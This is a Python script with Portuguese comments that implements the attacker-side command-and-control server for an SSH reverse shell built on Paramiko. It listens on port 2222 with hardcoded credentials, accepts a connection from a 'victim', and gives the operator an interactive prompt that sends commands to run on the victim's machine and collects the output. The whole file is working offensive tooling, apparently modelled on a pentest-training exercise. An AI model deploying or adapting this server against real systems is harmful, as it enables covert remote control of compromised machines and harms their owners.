### Script: c2_reverse_server.py
# Este script é o servidor que irá receber a conexão reversa do cliente (ssh_rcmd_reverse_shell.py). 
# Ele utiliza a biblioteca Paramiko para criar um servidor SSH e aceitar conexões.
# O servidor escuta na porta 2222 e, quando um cliente se conecta, 
# ele aceita a sessão e aguarda comandos do cliente. O cliente envia comandos para o servidor, 
# que os executa e retorna a saída de volta para o cliente. 
# Para testar, primeiro execute este script para iniciar o servidor, e depois execute o 
# ssh_rcmd_reverse_shell.py para conectar ao servidor e obter a shell reversa.

import socket
import paramiko
import threading
import sys
import os



KEY_FILE = 'test_rsa.key'

# Verifica se o arquivo da chave já existe
if not os.path.exists(KEY_FILE):
    print(f"[*] Arquivo '{KEY_FILE}' não encontrado. Gerando uma nova chave RSA...")
    # Gera uma nova chave RSA de 2048 bits
    key = paramiko.RSAKey.generate(bits=2048)
    # Salva a chave gerada no arquivo especificado
    key.write_private_key_file(KEY_FILE)
    print("[*] Chave gerada com sucesso!")


HOSTKEY = paramiko.RSAKey(filename=KEY_FILE)

####Define o usuário e a senha do C2
luser = 'username'
passwd = 'password'


class Server(paramiko.ServerInterface):
    def __init__(self):
        self.event = threading.Event()

    def check_channel_request(self, kind, chanid):
        # Para Reverse Shell, nós só aceitamos o tipo 'session'
        if kind == 'session':
            return paramiko.OPEN_SUCCEEDED
        return paramiko.OPEN_FAILED_ADMINISTRATIVELY_PROHIBITED

    def check_auth_password(self, username, password):
        if (username == luser) and (password == passwd ):
            return paramiko.AUTH_SUCCESSFUL
        return paramiko.AUTH_FAILED

def start_server():
    server_ip = '0.0.0.0'
    ssh_port = 2222
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((server_ip, ssh_port))
        sock.listen(100)
        print(f'[+] Servidor C2 (Reverse Shell) ouvindo em {server_ip}:{ssh_port}...')
        client, addr = sock.accept()
        print(f'[+] Vítima conectada de: {addr}')
    except Exception as e:
        print('[-] Falha na Escuta: ' + str(e))
        sys.exit(1)

    bhSession = paramiko.Transport(client)
    bhSession.add_server_key(HOSTKEY)
    server = Server()
    
    try:
        bhSession.start_server(server=server)
    except paramiko.SSHException:
        print("[-] Falha na negociação SSH.")
        sys.exit(1)

    # Aceita a sessão que o ssh_rcmd.py vai pedir
    chan = bhSession.accept(20)
    if chan is None:
        print("[-] Nenhum canal aberto pela vítima.")
        sys.exit(1)

    print('[+] Canal de comando aberto! Aguardando handshake da vítima...')
    
    # 1. O ssh_rcmd.py envia uma mensagem inicial assim que conecta. Nós lemos aqui:
    mensagem_inicial = chan.recv(1024).decode('utf-8', errors='ignore')
    print(f"[*] Vítima enviou: {mensagem_inicial}")
    
    # 2. Nós enviamos uma resposta para destravar o loop da vítima
    chan.send(b'Acesso Concedido. Shell C2 ativado.')

   # 3. O Loop Interativo do Atacante
    while True:
        try:
            # Pede o comando para você (O Atacante)
            command = input("C2_Shell $> ").strip()
            
            if not command:
                continue
                
            # Envia o comando para a vítima executar lá
            chan.send(command.encode('utf-8'))
            
            # Se for exit, matamos tudo elegantemente
            if command.lower() == 'exit':
                print("[*] Encerrando conexão...")
                bhSession.close()
                break
            
            # --- NOVA LÓGICA DE RECEBIMENTO (COLETA TOTAL) ---
            resposta_completa = b""
            
            # Dá até 2 segundos para a vítima processar o comando e começar a enviar
            chan.settimeout(2.0) 
            
            try:
                while True:
                    # Puxa o balde de 8KB
                    chunk = chan.recv(8192)
                    if len(chunk) == 0:
                        break # Se o canal fechar do nada, ele sai
                    
                    resposta_completa += chunk
                    
                    # Como os dados já começaram a chegar, os próximos pacotes 
                    # vêm em milissegundos. Reduzimos o timeout para não travar o terminal.
                    chan.settimeout(0.2) 
            except socket.timeout:
                # O timeout estourou. Isso significa que o "cano" esvaziou e toda a resposta chegou.
                pass 
            finally:
                # Remove o timeout para o servidor poder ficar aguardando o próximo input seu
                chan.settimeout(None) 
            
            # Imprime o bloco gigante de uma vez só
            print(resposta_completa.decode('utf-8', errors='ignore'))
            # -------------------------------------------------
            
        except KeyboardInterrupt:
            print("\n[*] Encerrando C2...")
            bhSession.close()
            sys.exit(0)
        except Exception as e:
            print(f"[-] Erro na conexão: {e}")
            bhSession.close()
            sys.exit(1)

if __name__ == '__main__':
    start_server()
